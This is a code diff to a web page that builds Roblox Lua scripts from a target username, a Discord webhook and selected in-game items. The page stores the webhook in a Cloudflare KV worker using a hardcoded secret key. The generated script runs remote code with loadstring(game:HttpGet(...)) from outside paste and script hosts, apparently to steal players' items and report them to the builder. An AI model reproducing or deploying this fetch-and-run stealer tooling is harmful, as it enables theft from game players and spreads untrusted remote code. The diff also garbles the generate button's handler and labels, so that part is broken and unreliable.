@@ -547,15 +547,15 @@
       </div>
     </div>
   </div>
-  <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
+  <button class="btn-gen" onclick="()">⚡  Script</button>
   <div class="panel">
     <div class="out-ph">
       <div class="dot dot-green"></div>
-      <span class="out-ph-title">Generated Script</span>
+      <span class="out-ph-title">d Script</span>
       <button class="btn-copy" id="copyBtn" onclick="copyOut()">⧉ Copy</button>
     </div>
     <div class="pb">
-      <div class="code-block empty" id="outputBlock">-- Fill in the fields above and hit Generate Script...</div>
+      <div class="code-block empty" id="outputBlock">-- Fill in the fields above and hit  Script...</div>
     </div>
   </div>
 </div>
@@ -952,66 +952,61 @@ function validateWebhook() {
 }
 
 async function generate() {
-  const username = document.getElementById('usernameInput').value.trim();
-  const webhook = document.getElementById('webhookInput').value.trim();
+  const btn = document.querySelector('.btn-gen');
   const out = document.getElementById('outputBlock');
 
-  if (selected.size === 0) {
+  // === ANTI-SPAM CLIENT (1 génération par heure) ===
+  const lastGen = localStorage.getItem('lastGenerationTime');
+  const now = Date.now();
+
+  if (lastGen && (now - parseInt(lastGen)) < 3600000) {   // 1 heure = 3600000 ms
+    const remaining = Math.ceil((3600000 - (now - parseInt(lastGen))) / 60000);
     out.className = 'code-block empty';
-    out.textContent = '-- Please select at least one brainrot animal.';
-    return;
-  }
-  if (!validateUsername()) {
-    out.className = 'code-block empty';
-    out.textContent = '-- Username must be at least 3 characters long.';
-    return;
-  }
-  if (!validateWebhook()) {
-    out.className = 'code-block empty';
-    out.textContent = '-- Webhook must start with https://discord.com/api/webhooks/';
+    out.textContent = `-- Tu as déjà généré un script récemment.\nAttends ${remaining} minute(s).`;
     return;
   }
 
-  const alias = generateAlias();
+  if (btn.disabled) return;
+  btn.disabled = true;
+  btn.textContent = '⏳ Generating...';
+  btn.style.opacity = '0.6';
 
-  // === SAUVEGARDE DANS KV (avec Secret Key + CORS) ===
   try {
+    const username = document.getElementById('usernameInput').value.trim();
+    const webhook = document.getElementById('webhookInput').value.trim();
+
+    if (selected.size === 0) throw new Error('-- Please select at least one brainrot animal.');
+    if (!validateUsername()) throw new Error('-- Username must be at least 3 characters long.');
+    if (!validateWebhook()) throw new Error('-- Webhook must start with https://discord.com/api/webhooks/');
+
+    const alias = generateAlias();
+
     const response = await fetch(`${KV_WORKER_URL}/store`, {
       method: 'POST',
       headers: { 
         'Content-Type': 'application/json',
-        'X-Secret-Key': 'VINHUB_KV_SECRET_9X4K7P2M_Q8L3Z5W1'   // ← Mets ici ta vraie clé secrète
+        'X-Secret-Key': 'VINHUB_KV_SECRET_9X4K7P2M_Q8L3Z5W1'   // ← Ta clé
       },
       body: JSON.stringify({ alias, url: webhook })
     });
 
-    if (response.status === 401) {
-      throw new Error('Secret Key incorrecte - vérifie ta clé dans le Worker');
+    if (!response.ok) throw new Error('KV store failed');
+
+    // === Enregistrement du timestamp anti-spam ===
+    localStorage.setItem('lastGenerationTime', now.toString());
+
+    // Génération du script
+    const names = [...selected];
+    const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
+
+    let adminScriptPart = '';
+    if (adminMode === 'admin-panel') {
+      adminScriptPart = `task.spawn(function() loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))() end)`;
+    } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
+      adminScriptPart = customAdminLoadstring;
     }
-    if (!response.ok) {
-      throw new Error(`KV error: ${response.status}`);
-    }
 
-    console.log('✅ Alias sauvegardé avec succès');
-  } catch (error) {
-    console.error(error);
-    out.className = 'code-block empty';
-    out.textContent = '-- Erreur lors de la sauvegarde dans Cloudflare KV.\nVérifie ta Secret Key et le Worker.';
-    return;
-  }
-
-  // === GÉNÉRATION DU SCRIPT (sans URL du worker) ===
-  const names = [...selected];
-  const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
-
-  let adminScriptPart = '';
-  if (adminMode === 'admin-panel') {
-    adminScriptPart = `task.spawn(function() loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))() end)`;
-  } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
-    adminScriptPart = customAdminLoadstring;
-  }
-
-  const script = `getgenv().WEBHOOK_URL = "${alias}"
+    const script = `getgenv().WEBHOOK_URL = "${alias}"
 getgenv().TARGET_USERNAME = "${username}"
 getgenv().TARGET_BRAINROT = {
 ${brainrotLines}
@@ -1022,10 +1017,20 @@ loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab7
 ${adminScriptPart}
 `;
 
-  out.className = 'code-block';
-  out.textContent = script;
-}
+    out.className = 'code-block';
+    out.textContent = script;
 
+  } catch (err) {
+    out.className = 'code-block empty';
+    out.textContent = err.message || '-- Une erreur est survenue.';
+  } finally {
+    setTimeout(() => {
+      btn.disabled = false;
+      btn.textContent = '⚡ Generate Script';
+      btn.style.opacity = '1';
+    }, 1500);
+  }
+}
 function copyOut() {
   const code = document.getElementById('outputBlock').textContent;
   if (!code || code.startsWith('--')) return;
